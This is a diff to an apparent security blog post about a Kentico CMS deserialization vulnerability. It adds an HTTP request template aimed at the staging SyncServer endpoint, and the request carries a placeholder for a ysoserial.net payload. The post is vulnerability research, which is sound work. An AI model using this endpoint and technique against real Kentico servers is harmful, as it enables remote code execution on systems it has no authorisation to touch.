@@ -269,6 +269,14 @@ remote code execution on the server where the Kentico instance was hosted.
 
 <p>Let’s then generate a sample evil serialized XML SOAP object string using ysoserial.net with the ActivitySurrogateSelector as gadget and SoapFormatter as payload format.</p>
 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData HTTP/1.1
+Host: ...
+...
+...
+
+stagingTaskData=&lt;ysoserial.net payload here&gt;
+</code></pre></div></div>
+
 <p>Here’s the PoC video:</p>
 
 <p><img src="https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/8.gif?raw=true" alt="poc" /></p>
